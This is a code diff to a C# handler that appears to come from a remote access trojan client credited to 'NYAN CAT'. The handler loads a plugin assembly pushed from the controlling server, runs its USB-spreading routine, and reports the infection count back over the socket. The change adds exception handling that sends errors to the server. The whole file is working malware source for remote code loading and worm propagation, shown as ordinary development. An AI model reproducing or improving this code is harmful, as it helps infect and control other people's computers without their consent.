@@ -1,5 +1,7 @@
 ﻿using Client.MessagePack;
 using Client.Sockets;
+using System;
+using System.Diagnostics;
 using System.Reflection;
 //
 //       │ Author     : NYAN CAT
@@ -15,16 +17,24 @@ namespace Client.Handle_Packet
     {
         public HandleLimeUSB(MsgPack unpack_msgpack)
         {
-            Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
-            MethodInfo meth = loader.GetType("HandleLimeUSB.HandleLimeUSB").GetMethod("Initialize");
-            object injObj = loader.CreateInstance(meth.Name);
-            int count = (int)meth.Invoke(injObj, null);
-            if (count > 0)
+            try
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "usbSpread";
-                msgpack.ForcePathObject("Count").AsString = count.ToString();
-                ClientSocket.Send(msgpack.Encode2Bytes());
+                Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
+                MethodInfo meth = loader.GetType("HandleLimeUSB.HandleLimeUSB").GetMethod("Initialize");
+                object injObj = loader.CreateInstance(meth.Name);
+                int count = (int)meth.Invoke(injObj, null);
+                if (count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "usbSpread";
+                    msgpack.ForcePathObject("Count").AsString = count.ToString();
+                    ClientSocket.Send(msgpack.Encode2Bytes());
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                Packet.Error(ex.Message);
             }
         }
     }
